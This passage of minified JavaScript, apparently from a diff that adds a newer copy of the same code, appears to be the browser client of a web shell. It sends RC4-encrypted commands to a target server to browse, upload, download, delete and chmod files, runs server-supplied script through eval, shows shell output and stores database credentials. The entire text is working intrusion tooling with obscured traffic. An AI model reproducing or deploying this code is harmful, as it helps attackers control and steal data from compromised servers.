row_array}};if(c.addEventListener)c.addEventListener("click",e,j);else{e.f||(e.f=n++);c.b||(c.b={});g=c.b.click;g||(g=c.b.click={},c.onclick&&(g[0]=c.onclick));g[e.f]=e;c.onclick=p}}}},j:function(a,b){sortfn=sorttable.l;for(c=0;c<a.tBodies[0].rows.length;c++)if(text=sorttable.d(a.tBodies[0].rows[c].cells[b]),""!=text){if(text.match(/^-?[\u00a3$\u00a4]?[\d,.]+%?$/))return sorttable.n;if(possdate=text.match(sorttable.a)){first=parseInt(possdate[1]);second=parseInt(possdate[2]);if(12<first)return sorttable.g;if(12<second)return sorttable.m;sortfn=sorttable.g}}return sortfn},d:function(a){if(!a)return"";hasInputs="function"==typeof a.getElementsByTagName&&a.getElementsByTagName("input").length;if(""!=a.title)return a.title;if("undefined"!=typeof a.textContent&&!hasInputs)return a.textContent.replace(/^\s+|\s+$/g,"");if("undefined"!=typeof a.innerText&&!hasInputs)return a.innerText.replace(/^\s+|\s+$/g,"");if("undefined"!=typeof a.text&&!hasInputs)return a.text.replace(/^\s+|\s+$/g,"");switch(a.nodeType){case 3:if("input"==a.nodeName.toLowerCase())return a.value.replace(/^\s+|\s+$/g,"");case 4:return a.nodeValue.replace(/^\s+|\s+$/g,"");case 1:case 11:for(b="",c=0;c<a.childNodes.length;c++)b+=sorttable.d(a.childNodes[c]);return b.replace(/^\s+|\s+$/g,"");default:return""}},reverse:function(a){newrows=[];for(b=0;b<a.rows.length;b++)newrows[newrows.length]=a.rows[b];for(b=newrows.length-1;0<=b;b--)a.appendChild(newrows[b]);delete newrows},n:function(a,b){aa=parseFloat(a[0].replace(/[^0-9.-]/g,""));isNaN(aa)&&(aa=0);bb=parseFloat(b[0].replace(/[^0-9.-]/g,""));isNaN(bb)&&(bb=0);return aa-bb},l:function(a,b){return a[0].toLowerCase()==b[0].toLowerCase()?0:a[0].toLowerCase()<b[0].toLowerCase()?-1:1},g:function(a,b){mtch=a[0].match(sorttable.a);y=mtch[3];m=mtch[2];d=mtch[1];1==m.length&&(m="0"+m);1==d.length&&(d="0"+d);dt1=y+m+d;mtch=b[0].match(sorttable.a);y=mtch[3];m=mtch[2];d=mtch[1];1==m.length&&(m="0"+m);1==d.length&&(d="0"+d);dt2=y+m+d;return dt1==dt2?0:dt1<dt2?-1:1},m:function(a,b){mtch=a[0].match(sorttable.a);y=mtch[3];d=mtch[2];m=mtch[1];1==m.length&&(m="0"+m);1==d.length&&(d="0"+d);dt1=y+m+d;mtch=b[0].match(sorttable.a);y=mtch[3];d=mtch[2];m=mtch[1];1==m.length&&(m="0"+m);1==d.length&&(d="0"+d);dt2=y+m+d;return dt1==dt2?0:dt1<dt2?-1:1},r:function(a,b){for(c=0,e=a.length-1,g=h;g;){for(g=j,f=c;f<e;++f)0<b(a[f],a[f+1])&&(g=a[f],a[f]=a[f+1],a[f+1]=g,g=h);e--;if(!g)break;for(f=e;f>c;--f)0>b(a[f],a[f-1])&&(g=a[f],a[f]=a[f-1],a[f-1]=g,g=h);c++}}};n=1;function p(a){b=h;a||(a=((this.ownerDocument||this.document||this).parentWindow||window).event,a.preventDefault=q,a.stopPropagation=r);c=this.b[a.type],e;for(e in c)this.h=c[e],this.h(a)===j&&(b=j);return b}function q(){this.returnValue=j}function r(){this.cancelBubble=h}Array.forEach||(Array.forEach=function(a,b,c){for(e=0;e<a.length;e++)b.call(c,a[e],e,a)});Function.prototype.forEach=function(a,b,c){for(e in a)"undefined"==typeof this.prototype[e]&&b.call(c,a[e],e,a)};String.forEach=function(a,b,c){Array.forEach(a.split(""),function(e,g){b.call(c,e,g,a)})};function l(a,b){if(a){c=Object;if(a instanceof Function)c=Function;else{if(a.forEach instanceof Function){a.forEach(b,void 0);return}"string"==typeof a?c=String:"number"==typeof a.length&&(c=Array)}c.forEach(a,b,void 0)}};function append(e,c){o=d.getElementById(e);if(o)o.innerHTML+=c}function prepend(e,c){o=d.getElementById(e);if(o)o.innerHTML=c+o.innerHTML}function remove(e){o=d.getElementById(e);if(o)o.parentNode.removeChild(o)}function empty(e){o=d.getElementById(e);if(o)o.innerHTML=null}function serialize(form){var i,j,q=[];if(!form||form.nodeName!=="FORM")return;for(i=form.elements.length-1;i>=0;i=i-1){if(form.elements[i].name==="")continue;switch(form.elements[i].nodeName){case"INPUT":switch(form.elements[i].type){case"text":case"hidden":case"password":case"button":case"reset":case"submit":q.push(form.elements[i].name+"="+euc(form.elements[i].value));break;case"checkbox":case"radio":if(form.elements[i].checked)q.push(form.elements[i].name+"="+euc(form.elements[i].value));break;case"file":break}break;case"TEXTAREA":q.push(form.elements[i].name+"="+euc(form.elements[i].value));break;case"SELECT":switch(form.elements[i].type){case"select-one":q.push(form.elements[i].name+"="+euc(form.elements[i].value));break;case"select-multiple":for(j=form.elements[i].options.length-1;j>=0;j=j-1){if(form.elements[i].options[j].selected)q.push(form.elements[i].name+"="+euc(form.elements[i].options[j].value))}break}break;case"BUTTON":switch(form.elements[i].type){case"reset":case"submit":case"button":q.push(form.elements[i].name+"="+euc(form.elements[i].value));break}break}}return q.join("&")}function getData(s,m){k=rc4Init(hash);try{if(m==="e"){r=euc(btoa(rc4(randStr(28)+s,k)))}else r=rc4(atob(s),k).substr(28)}catch(err){r=d}return r}function ajax(p,cf){console.log(p);var ao={};lastAjax=p;ao.cf=cf;ao.request=new XMLHttpRequest();ao.bindFunction=function(caller,object){return function(){return caller.apply(object,[object])}};ao.stateChange=function(object){if(ao.request.readyState==4)ao.cf(getData(ao.request.responseText,"d"))};if(window.XMLHttpRequest){req=ao.request;req.onreadystatechange=ao.bindFunction(ao.stateChange,ao);req.open("POST",targeturl,true);req.setRequestHeader("X-Requested-With","XMLHttpRequest");req.setRequestHeader("Content-Type","application/x-www-form-urlencoded");req.setRequestHeader("Connection","close");req.send("dsr="+getData(p,"e"))}return ao}function dpath(e,t){if(t)return d.getElementById("base").value+e.parentNode.parentNode.getAttribute("data-path");else return e.parentNode.parentNode.getAttribute("data-path")}function drag_start(){if(!onDrag){onDrag=true;d.addEventListener("mousemove",function(e){dragX=e.pageX;dragY=e.pageY},false);setTimeout("drag_loop()",50)}}function drag_loop(){if(onDrag){x=dragX-dragDeltaX;y=dragY-dragDeltaY;if(x<0)x=0;if(y<0)y=0;o=d.getElementById("box").style;o.left=x+"px";o.top=y+"px";setTimeout("drag_loop()",50)}}function drag_stop(){onDrag=false}function show_box(t,ct){hide_box();box="<div id=\'box\' class=\'box\'><p id=\'boxtitle\' class=\'boxtitle\'>"+t+"<span onclick=\'hide_box();\' class=\'boxclose floatRight\'>x</span></p><div class=\'boxcontent\'>"+ct+"</div></div>";append("content",box);x=(d.body.clientWidth-d.getElementById("box").clientWidth)/2;y=(d.body.clientHeight-d.getElementById("box").clientHeight)/2;if(x<0)x=0;if(y<0)y=0;dragX=x;dragY=y;o=d.getElementById("box").style;o.left=x+"px";o.top=y+"px";d.addEventListener("keyup",function(e){if(e.keyCode===27)hide_box()});d.getElementById("boxtitle").addEventListener("click",function(e){e.preventDefault();if(!onDrag){dragDeltaX=e.pageX-parseInt(o.left);dragDeltaY=e.pageY-parseInt(o.top);drag_start()}else drag_stop()},false);if(d.getElementById("uival"))d.getElementById("uival").focus()}function hide_box(){onDrag=false;remove("box");remove("dlf")}function ajaxLoad(p){empty("content");append("content","<div class=\'loading\'></div>");ajax(p,function(r){empty("content");append("content",r);uiUpdateControls();lastLoad=p})}function uiUpdateControls(){o=d.getElementById("jseval");if(o)eval(o.value);o=d.getElementById("sort");if(o)sorttable.k(o);o=d.getElementById("etime");if(o)d.getElementById("uetime").innerHTML=o.value}function viewSize(f){f.innerHTML="<div class=\'loading mini\'></div>";ajax("me=filemanager&md=vs&f="+euc(dpath(f,true)),function(r){f.innerHTML=r})}function godir(f,t){ajaxLoad("me=filemanager&dir="+euc(dpath(f,t)))}function godisk(f){ajaxLoad("me=filemanager&dir="+euc(f.getAttribute("data-path")))}function godirui(){ajaxLoad("me=filemanager&dir="+euc(d.getElementById("goui").value))}function showUI(a,o){path=dpath(o,false);datapath=dpath(o,true);disabled="";text="Name";btitle="Go!";if(a==="del"){disabled="disabled";title="Del"}else if(a==="ren"){title="Rename"}else if(a==="mpers"){path=o.innerHTML.substring(17,21);title="Chmod/Chown";text=title.substring(0,5)}else if(a==="mdate"){path=o.getAttribute("data-ft");title="Date";text=title}else if((a==="cdir")||(a==="cfile")){path="";datapath=d.getElementById("base").value;title="Create directory";if(a==="cfile")title="Create file"}ct="<table class=\'boxtbl\'>"+"<tr><td class=\'colFit\'>"+text+"</td><td><input class=\'\' name=\'uival\' id=\'uival\' value=\'"+path+"\' type=\'text\' "+disabled+" /></td></tr>"+"<tr data-path=\'"+datapath+"\'><td colspan=\'2\'><span class=\'button\' onclick=\'processUI(&quot;"+a+"&quot;, dpath(this, false), d.getElementById(&quot;uival&quot;).value);\'>"+btitle+"</span></td></tr>"+"</table>";show_box(title,ct)}function showUISec(a){btitle="Go!";uival="";n="&quot;&quot;";s=serialize(d.forms[0]).replace(/chkall=&/g,"");s=s.substring(0,s.indexOf("&goui="));if(a==="comp"){title="Download"}else if(a==="uncomp"){title="Uncompress"}else if(a==="copy"){title="Copy";uival="<tr><td class=\'colFit\'>To</td><td><input class=\'\' name=\'uival\' id=\'uival\' value=\'\' type=\'text\'  /></td></tr>";n="d.getElementById(&quot;uival&quot;).value"}else if(a==="rdel"){title="Del"}ct="<table class=\'boxtbl\'>"+uival+"<tr><td colspan=\'2\'><textarea disabled=\'\' wrap=\'off\' style=\'height:120px;min-height:120px;\'>"+decodeURIComponent(s).replace(/&/g,"\n")+"</textarea></td></tr>"+"<tr><td colspan=\'2\'><span class=\'button\' onclick=\'processUI(&quot;"+a+"&quot;, &quot;&"+s+"&fl="+euc(d.getElementById("base").value)+"&quot;, "+n+");\'>"+btitle+"</span></td></tr>"+"</table>";show_box(title,ct)}function showFMExtras(){ct="<form name=\'fmexs\'>"+"<table class=\'boxtbl\'>"+"<tr><td class=\'colFit\'>Show only<select class=\'theme\' id=\'fm_mode\' name=\'fm_mode\'  ><option value=\'all\'>All</option><option value=\'file\'>File</option><option value=\'dir\'>Dir</option></select></td><td>&nbsp;</td></tr>"+"<tr><td class=\'colFit\'>Only writable<input id=\'fm_onlyW\' name=\'fm_onlyW\' value=\'1\' type=\'checkbox\' onclick=\'\' /></td><td>&nbsp;</td></tr>"+"<tr><td class=\'colFit\'>Recursive listing<input id=\'fm_rec\' name=\'fm_rec\' value=\'1\' type=\'checkbox\' onclick=\'\' /></td><td>&nbsp;</td></tr>"+"<tr><td colspan=\'2\'><span class=\'button\' onclick=\'ajaxLoad(serialize(d.forms[1]));\'>Show</span></td></tr>"+"</table>"+"<input id=\'me\' name=\'me\' type=\'hidden\' value=\'file\' /><input id=\'dir\' name=\'dir\' type=\'hidden\' value=\'"+d.getElementById("base").value+"\' />"+"</form>";show_box("Show extra tools",ct)}function processUI(a,o,n){if(a==="del"||a==="rdel")if(!confirm(\'Are you sure?\')){hide_box();return}if(a==="comp"){hide_box();append("content","<iframe id=\'dlf\' class=\'hide\' src=\'"+targeturl+"?dsr="+getData("me=filemanager&md=tools&ac=comp&"+o,"e")+"\'></iframe>")}else{if(a==="uncomp")o="dummy"+o;else if(a!=="rdel"&&n==="")return;else if(a!=="copy"&&a!=="rdel")o=euc(o);else if(a==="ren")n=d.getElementById("base").value+n;append("box","<div id=\'mloading\' class=\'loading mini\'></div>");ajax("me=filemanager&md=tools&ac="+a+"&a="+o+"&b="+euc(n),function(r){remove("mloading");if(r==="OK"){hide_box();ajaxLoad(lastLoad)}else append("box","<div class=\'boxresult\'>"+r+"</div>")})}}function dl(o){remove("dlf");append("content","<iframe id=\'dlf\' class=\'hide\' src=\'"+targeturl+"?dsr="+getData("me=filemanager&md=tools&ac=dl&fl="+euc(dpath(o,true)),"e")+"\'></iframe>")}function up(){ct="<form name=\'up\' enctype=\'multipart/form-data\' method=\'post\' action=\'"+targeturl+"\'>"+"<input type=\'hidden\' value=\'"+decodeURIComponent(getData("me=filemanager&ac=up&dir="+euc(d.getElementById("base").value),"e"))+"\' name=\'dsr\'>"+"<table class=\'boxtbl\'>"+"<tr><td class=\'colFit\'>URL</td><td><input class=\'\' name=\'uri\' id=\'uri\' value=\'\' type=\'text\'  /></td></tr>"+"<tr><td class=\'colFit\'>File</td><td><input id=\'upf\' name=\'upf\' value=\'\' type=\'file\' /></td></tr>"+"<tr><td colspan=\'2\'><span class=\'button\' onclick=\'upaction()\'>Go!</span></td></tr>"+"</table>"+"</form>";show_box("Upload",ct)}function upaction(){uri=d.getElementById("uri").value;if(uri!=="")processUI("reup",d.getElementById("base").value,uri);else if(d.getElementById("upf").value!=="")document.up.submit()}function uiupdate(t){ajax(serialize(d.forms[t]),function(r){if(!d.getElementById("uires"))prepend("content","<div id=\'uires\' class=\'uires\'></div>");append("uires","Shell response: "+r+"<br>\n");d.getElementById("uires").scrollIntoView()})}function CheckAll(form){for(i=0;i<form.elements.length;i++){e=form.elements[i];if(e.name!="chkall")e.checked=form.chkall.checked}}function toggle(b){if(d.getElementById(b)){if(d.getElementById(b).style.display=="block")d.getElementById(b).style.display="none";else d.getElementById(b).style.display="block"}}function change(l,b){d.getElementById(l).style.display="none";d.getElementById(b).style.display="block";if(d.getElementById("goui"))d.getElementById("goui").focus()}function hilite(e){c=e.parentElement.parentElement;if(e.checked)c.className="mark";else c.className="";a=d.getElementsByName("cbox");b=d.getElementById("total_selected");c=0;for(i=0;i<a.length;i++)if(a[i].checked)c++;if(c==0)b.innerHTML="";else b.innerHTML=" ( selected : "+c+" items )"}function dbexec(c){empty("dbRes");append("dbRes","<div class=\'loading\'></div>");ajax(serialize(d.forms[0])+\'&code=\'+c,function(r){empty("dbRes");append("dbRes",r);uiUpdateControls()})}function dbengine(t){d.getElementById("su").className="hide";d.getElementById("sp").className="hide";d.getElementById("so").className="hide";if((t.value==="odbc")||(t.value==="pdo")){d.getElementById("sh").innerHTML="DSN/Connection String";d.getElementById("su").className="";d.getElementById("sp").className=""}else if((t.value==="sqlite")||(t.value==="sqlite3")){d.getElementById("sh").innerHTML="DB File"}else{d.getElementById("sh").innerHTML="Host";d.getElementById("su").className="";d.getElementById("sp").className="";d.getElementById("so").className=""}}function dbhistory(a){if(a=="s"){o={history:[]};if(sessionStorage.getItem("conlog")!=null)o=JSON.parse(sessionStorage.getItem("conlog"));o.history.push({"type":d.getElementById("type").value,"host":d.getElementById("host").value,"port":d.getElementById("port").value,"user":d.getElementById("user").value,"pass":d.getElementById("pass").value});sessionStorage.setItem("conlog",JSON.stringify(o))}else if(sessionStorage.getItem("conlog")!=null){s="";o=JSON.parse(sessionStorage.getItem("conlog"));for(i=0;i<o.history.length;i++){u="me=sql&host="+o.history[i].host+"&port="+o.history[i].port+"&user="+o.history[i].user+"&pass="+o.history[i].pass+"&type="+o.history[i].type;s+="["+o.history[i].type.toUpperCase()+"] "+o.history[i].user+"@"+o.history[i].host+"<span style=\'float:right;\'><a href=\'#\' onclick=\'ajaxLoad(&quot;"+u+"&quot;)\'>Go!</a></span><br>"}if(s!="")prepend("content","<div id=\'uires\' class=\'uires\'>"+s+"</div>")}}
+	  		var h=0;var j=1;var d=document;var euc=encodeURIComponent;var onDrag=false;var dragX,dragY,dragDeltaX,dragDeltaY,lastAjax,lastLoad="";var copyBuffer=[];sorttable={k:function(a){sorttable.a=/^(\d\d?)[\/\.-](\d\d?)[\/\.-]((\d\d)?\d\d)$/,0==a.getElementsByTagName("thead").length&&(the=d.createElement("thead"),the.appendChild(a.rows[0]),a.insertBefore(the,a.firstChild));null==a.tHead&&(a.tHead=a.getElementsByTagName("thead")[0]);if(1==a.tHead.rows.length){sortbottomrows=[];for(b=0;b<a.rows.length;b++)-1!=a.rows[b].className.search(/\bsortbottom\b/)&&(sortbottomrows[sortbottomrows.length]=a.rows[b]);if(sortbottomrows){null==a.tFoot&&(tfo=d.createElement("tfoot"),a.appendChild(tfo));for(b=0;b<sortbottomrows.length;b++)tfo.appendChild(sortbottomrows[b]);delete sortbottomrows}headrow=a.tHead.rows[0].cells;for(b=0;b<headrow.length;b++)if(!headrow[b].className.match(/\bsorttable_nosort\b/)){(mtch=headrow[b].className.match(/\bsorttable_([a-z0-9]+)\b/))&&(override=mtch[1]);headrow[b].p=mtch&&"function"==typeof sorttable["sort_"+override]?sorttable["sort_"+override]:sorttable.j(a,b);headrow[b].o=b;headrow[b].c=a.tBodies[0];c=headrow[b],e=sorttable.q=function(){if(-1!=this.className.search(/\bsorttable_sorted\b/))sorttable.reverse(this.c),this.className=this.className.replace("sorttable_sorted","sorttable_sorted_reverse"),this.removeChild(d.getElementById("sorttable_sortfwdind")),sortrevind=d.createElement("span"),sortrevind.id="sorttable_sortrevind",sortrevind.innerHTML="&nbsp;&#x25B4;",this.appendChild(sortrevind);else if(-1!=this.className.search(/\bsorttable_sorted_reverse\b/))sorttable.reverse(this.c),this.className=this.className.replace("sorttable_sorted_reverse","sorttable_sorted"),this.removeChild(d.getElementById("sorttable_sortrevind")),sortfwdind=d.createElement("span"),sortfwdind.id="sorttable_sortfwdind",sortfwdind.innerHTML="&nbsp;&#x25BE;",this.appendChild(sortfwdind);else{theadrow=this.parentNode;l(theadrow.childNodes,function(a){1==a.nodeType&&(a.className=a.className.replace("sorttable_sorted_reverse",""),a.className=a.className.replace("sorttable_sorted",""))});(sortfwdind=d.getElementById("sorttable_sortfwdind"))&&sortfwdind.parentNode.removeChild(sortfwdind);(sortrevind=d.getElementById("sorttable_sortrevind"))&&sortrevind.parentNode.removeChild(sortrevind);this.className+=" sorttable_sorted";sortfwdind=d.createElement("span");sortfwdind.id="sorttable_sortfwdind";sortfwdind.innerHTML="&nbsp;&#x25BE;";this.appendChild(sortfwdind);row_array=[];col=this.o;rows=this.c.rows;for(a=0;a<rows.length;a++)row_array[row_array.length]=[sorttable.d(rows[a].cells[col]),rows[a]];row_array.sort(this.p);tb=this.c;for(a=0;a<row_array.length;a++)tb.appendChild(row_array[a][1]);delete row_array}};if(c.addEventListener)c.addEventListener("click",e,j);else{e.f||(e.f=n++);c.b||(c.b={});g=c.b.click;g||(g=c.b.click={},c.onclick&&(g[0]=c.onclick));g[e.f]=e;c.onclick=p}}}},j:function(a,b){sortfn=sorttable.l;for(c=0;c<a.tBodies[0].rows.length;c++)if(text=sorttable.d(a.tBodies[0].rows[c].cells[b]),""!=text){if(text.match(/^-?[\u00a3$\u00a4]?[\d,.]+%?$/))return sorttable.n;if(possdate=text.match(sorttable.a)){first=parseInt(possdate[1]);second=parseInt(possdate[2]);if(12<first)return sorttable.g;if(12<second)return sorttable.m;sortfn=sorttable.g}}return sortfn},d:function(a){if(!a)return"";hasInputs="function"==typeof a.getElementsByTagName&&a.getElementsByTagName("input").length;if(""!=a.title)return a.title;if("undefined"!=typeof a.textContent&&!hasInputs)return a.textContent.replace(/^\s+|\s+$/g,"");if("undefined"!=typeof a.innerText&&!hasInputs)return a.innerText.replace(/^\s+|\s+$/g,"");if("undefined"!=typeof a.text&&!hasInputs)return a.text.replace(/^\s+|\s+$/g,"");switch(a.nodeType){case 3:if("input"==a.nodeName.toLowerCase())return a.value.replace(/^\s+|\s+$/g,"");case 4:return a.nodeValue.replace(/^\s+|\s+$/g,"");case 1:case 11:for(b="",c=0;c<a.childNodes.length;c++)b+=sorttable.d(a.childNodes[c]);return b.replace(/^\s+|\s+$/g,"");default:return""}},reverse:function(a){newrows=[];for(b=0;b<a.rows.length;b++)newrows[newrows.length]=a.rows[b];for(b=newrows.length-1;0<=b;b--)a.appendChild(newrows[b]);delete newrows},n:function(a,b){aa=parseFloat(a[0].replace(/[^0-9.-]/g,""));isNaN(aa)&&(aa=0);bb=parseFloat(b[0].replace(/[^0-9.-]/g,""));isNaN(bb)&&(bb=0);return aa-bb},l:function(a,b){return a[0].toLowerCase()==b[0].toLowerCase()?0:a[0].toLowerCase()<b[0].toLowerCase()?-1:1},g:function(a,b){mtch=a[0].match(sorttable.a);y=mtch[3];m=mtch[2];d=mtch[1];1==m.length&&(m="0"+m);1==d.length&&(d="0"+d);dt1=y+m+d;mtch=b[0].match(sorttable.a);y=mtch[3];m=mtch[2];d=mtch[1];1==m.length&&(m="0"+m);1==d.length&&(d="0"+d);dt2=y+m+d;return dt1==dt2?0:dt1<dt2?-1:1},m:function(a,b){mtch=a[0].match(sorttable.a);y=mtch[3];d=mtch[2];m=mtch[1];1==m.length&&(m="0"+m);1==d.length&&(d="0"+d);dt1=y+m+d;mtch=b[0].match(sorttable.a);y=mtch[3];d=mtch[2];m=mtch[1];1==m.length&&(m="0"+m);1==d.length&&(d="0"+d);dt2=y+m+d;return dt1==dt2?0:dt1<dt2?-1:1},r:function(a,b){for(c=0,e=a.length-1,g=h;g;){for(g=j,f=c;f<e;++f)0<b(a[f],a[f+1])&&(g=a[f],a[f]=a[f+1],a[f+1]=g,g=h);e--;if(!g)break;for(f=e;f>c;--f)0>b(a[f],a[f-1])&&(g=a[f],a[f]=a[f-1],a[f-1]=g,g=h);c++}}};n=1;function p(a){b=h;a||(a=((this.ownerDocument||this.document||this).parentWindow||window).event,a.preventDefault=q,a.stopPropagation=r);c=this.b[a.type],e;for(e in c)this.h=c[e],this.h(a)===j&&(b=j);return b}function q(){this.returnValue=j}function r(){this.cancelBubble=h}Array.forEach||(Array.forEach=function(a,b,c){for(e=0;e<a.length;e++)b.call(c,a[e],e,a)});Function.prototype.forEach=function(a,b,c){for(e in a)"undefined"==typeof this.prototype[e]&&b.call(c,a[e],e,a)};String.forEach=function(a,b,c){Array.forEach(a.split(""),function(e,g){b.call(c,e,g,a)})};function l(a,b){if(a){c=Object;if(a instanceof Function)c=Function;else{if(a.forEach instanceof Function){a.forEach(b,void 0);return}"string"==typeof a?c=String:"number"==typeof a.length&&(c=Array)}c.forEach(a,b,void 0)}};function append(e,c){o=d.getElementById(e);if(o)o.innerHTML+=c}function prepend(e,c){o=d.getElementById(e);if(o)o.innerHTML=c+o.innerHTML}function remove(e){o=d.getElementById(e);if(o)o.parentNode.removeChild(o)}function empty(e){o=d.getElementById(e);if(o)o.innerHTML=null}function serialize(form){var i,j,q=[];if(!form||form.nodeName!=="FORM")return;for(i=form.elements.length-1;i>=0;i=i-1){if(form.elements[i].name==="")continue;switch(form.elements[i].nodeName){case"INPUT":switch(form.elements[i].type){case"text":case"hidden":case"password":case"button":case"reset":case"submit":q.push(form.elements[i].name+"="+euc(form.elements[i].value));break;case"checkbox":case"radio":if(form.elements[i].checked)q.push(form.elements[i].name+"="+euc(form.elements[i].value));break;case"file":break}break;case"TEXTAREA":q.push(form.elements[i].name+"="+euc(form.elements[i].value));break;case"SELECT":switch(form.elements[i].type){case"select-one":q.push(form.elements[i].name+"="+euc(form.elements[i].value));break;case"select-multiple":for(j=form.elements[i].options.length-1;j>=0;j=j-1){if(form.elements[i].options[j].selected)q.push(form.elements[i].name+"="+euc(form.elements[i].options[j].value))}break}break;case"BUTTON":switch(form.elements[i].type){case"reset":case"submit":case"button":q.push(form.elements[i].name+"="+euc(form.elements[i].value));break}break}}return q.join("&")}function getData(d,t){b=rc4Init(hash);try{if(t==="e")r=euc(btoa(rc4(randStr(49)+d,b)));else r=rc4(atob(d),b).substr(49)}catch(err){r=d}return r}function ajax(p,cf){var ao={};lastAjax=p;ao.cf=cf;ao.request=new XMLHttpRequest();ao.bindFunction=function(caller,object){return function(){return caller.apply(object,[object])}};ao.stateChange=function(object){if(ao.request.readyState==4)ao.cf(getData(ao.request.responseText,"d"))};if(window.XMLHttpRequest){req=ao.request;req.onreadystatechange=ao.bindFunction(ao.stateChange,ao);req.open("POST",targeturl,true);req.setRequestHeader("X-Requested-With","XMLHttpRequest");req.setRequestHeader("Content-Type","application/x-www-form-urlencoded");req.setRequestHeader("Connection","close");req.send("dsr="+getData(p,"e"))}return ao}function dpath(e,t){if(t)return d.getElementById("base").value+e.parentNode.parentNode.getAttribute("data-path");else return e.parentNode.parentNode.getAttribute("data-path")}function drag_start(){if(!onDrag){onDrag=true;d.addEventListener("mousemove",function(e){dragX=e.pageX;dragY=e.pageY},false);setTimeout("drag_loop()",50)}}function drag_loop(){if(onDrag){x=dragX-dragDeltaX;y=dragY-dragDeltaY;if(x<0)x=0;if(y<0)y=0;o=d.getElementById("box").style;o.left=x+"px";o.top=y+"px";setTimeout("drag_loop()",50)}}function drag_stop(){onDrag=false}function show_box(t,ct){hide_box();box="<div id=\'box\' class=\'box\'><p id=\'boxtitle\' class=\'boxtitle\'>"+t+"<span onclick=\'hide_box();\' class=\'boxclose floatRight\'>x</span></p><div class=\'boxcontent\'>"+ct+"</div></div>";append("content",box);x=(d.body.clientWidth-d.getElementById("box").clientWidth)/2;y=(d.body.clientHeight-d.getElementById("box").clientHeight)/2;if(x<0)x=0;if(y<0)y=0;dragX=x;dragY=y;o=d.getElementById("box").style;o.left=x+"px";o.top=y+"px";d.addEventListener("keyup",function(e){if(e.keyCode===27)hide_box()});d.getElementById("boxtitle").addEventListener("click",function(e){e.preventDefault();if(!onDrag){dragDeltaX=e.pageX-parseInt(o.left);dragDeltaY=e.pageY-parseInt(o.top);drag_start()}else drag_stop()},false);if(d.getElementById("uival"))d.getElementById("uival").focus()}function hide_box(){onDrag=false;remove("box");remove("dlf")}function ajaxLoad(p){empty("content");append("content","<div class=\'loading\'></div>");ajax(p,function(r){empty("content");append("content",r);uiUpdateControls();lastLoad=p})}function uiUpdateControls(){o=d.getElementById("jseval");if(o)eval(o.value);o=d.getElementById("sort");if(o)sorttable.k(o);o=d.getElementById("etime");if(o)d.getElementById("uetime").innerHTML=o.value}function viewSize(f){f.innerHTML="<div class=\'loading mini\'></div>";ajax("me=filemanager&md=vs&f="+euc(dpath(f,true)),function(r){f.innerHTML=r})}function godir(f,t){ajaxLoad("me=filemanager&dir="+euc(dpath(f,t)))}function godisk(f){ajaxLoad("me=filemanager&dir="+euc(f.getAttribute("data-path")))}function godirui(){ajaxLoad("me=filemanager&dir="+euc(d.getElementById("goui").value))}function showUI(a,o){path=dpath(o,false);datapath=dpath(o,true);disabled="";text="Name";btitle="Go!";if(a==="del"){disabled="disabled";title="Del"}else if(a==="ren"){title="Rename"}else if(a==="mpers"){path=o.innerHTML.substring(17,21);title="Chmod/Chown";text=title.substring(0,5)}else if(a==="mdate"){path=o.getAttribute("data-ft");title="Date";text=title}else if((a==="cdir")||(a==="cfile")){path="";datapath=d.getElementById("base").value;title="Create directory";if(a==="cfile")title="Create file"}ct="<table class=\'boxtbl\'>"+"<tr><td class=\'colFit\'>"+text+"</td><td><input class=\'\' name=\'uival\' id=\'uival\' value=\'"+path+"\' type=\'text\' "+disabled+" /></td></tr>"+"<tr data-path=\'"+datapath+"\'><td colspan=\'2\'><span class=\'button\' onclick=\'processUI(&quot;"+a+"&quot;, dpath(this, false), d.getElementById(&quot;uival&quot;).value);\'>"+btitle+"</span></td></tr>"+"</table>";show_box(title,ct)}function showUISec(a){btitle="Go!";uival="";n="&quot;&quot;";s=serialize(d.forms[0]).replace(/chkall=&/g,"");s=s.substring(0,s.indexOf("&goui="));if(a==="comp"){title="Download"}else if(a==="copy"){title="Copy";uival="<tr><td class=\'colFit\'>To</td><td><input class=\'\' name=\'uival\' id=\'uival\' value=\'\' type=\'text\'  /></td></tr>";n="d.getElementById(&quot;uival&quot;).value"}else if(a==="rdel"){title="Del"}ct="<table class=\'boxtbl\'>"+uival+"<tr><td colspan=\'2\'><textarea disabled=\'\' wrap=\'off\' style=\'height:120px;min-height:120px;\'>"+decodeURIComponent(s).replace(/&/g,"\n")+"</textarea></td></tr>"+"<tr><td colspan=\'2\'><span class=\'button\' onclick=\'processUI(&quot;"+a+"&quot;, &quot;&"+s+"&fl="+euc(d.getElementById("base").value)+"&quot;, "+n+");\'>"+btitle+"</span></td></tr>"+"</table>";if(a==="comp"&&s.length>2000)ct+="<div class=\'boxresult\'>WARNING the GET request is > 2000 chars</div>";show_box(title,ct)}function showFMExtras(){ct="<form name=\'fmexs\'>"+"<table class=\'boxtbl\'>"+"<tr><td class=\'colFit\'>Show only<select class=\'theme\' id=\'fm_mode\' name=\'fm_mode\'  ><option value=\'all\'>All</option><option value=\'file\'>File</option><option value=\'dir\'>Dir</option></select></td><td>&nbsp;</td></tr>"+"<tr><td class=\'colFit\'>Only writable<input id=\'fm_onlyW\' name=\'fm_onlyW\' value=\'1\' type=\'checkbox\' onclick=\'\' /></td><td>&nbsp;</td></tr>"+"<tr><td class=\'colFit\'>Recursive listing<input id=\'fm_rec\' name=\'fm_rec\' value=\'1\' type=\'checkbox\' onclick=\'\' /></td><td>&nbsp;</td></tr>"+"<tr><td colspan=\'2\'><span class=\'button\' onclick=\'ajaxLoad(serialize(d.forms[1]));\'>Show</span></td></tr>"+"</table>"+"<input id=\'me\' name=\'me\' type=\'hidden\' value=\'file\' /><input id=\'dir\' name=\'dir\' type=\'hidden\' value=\'"+d.getElementById("base").value+"\' />"+"</form>";show_box("Show extra tools",ct)}function processUI(a,o,n){if(a==="del"||a==="rdel")if(!confirm(\'Are you sure?\')){hide_box();return}if(a==="comp"){hide_box();append("content","<iframe id=\'dlf\' class=\'hide\' src=\'"+targeturl+"?dsr="+getData("me=filemanager&md=tools&ac=comp&"+o,"e")+"\'></iframe>")}else{if(a!=="rdel"&&n==="")return;if(a!=="copy"&&a!=="rdel")o=euc(o);if(a==="ren")n=d.getElementById("base").value+n;append("box","<div id=\'mloading\' class=\'loading mini\'></div>");ajax("me=filemanager&md=tools&ac="+a+"&a="+o+"&b="+euc(n),function(r){remove("mloading");if(r==="OK"){hide_box();ajaxLoad(lastLoad)}else append("box","<div class=\'boxresult\'>"+r+"</div>")})}}function dl(o){remove("dlf");append("content","<iframe 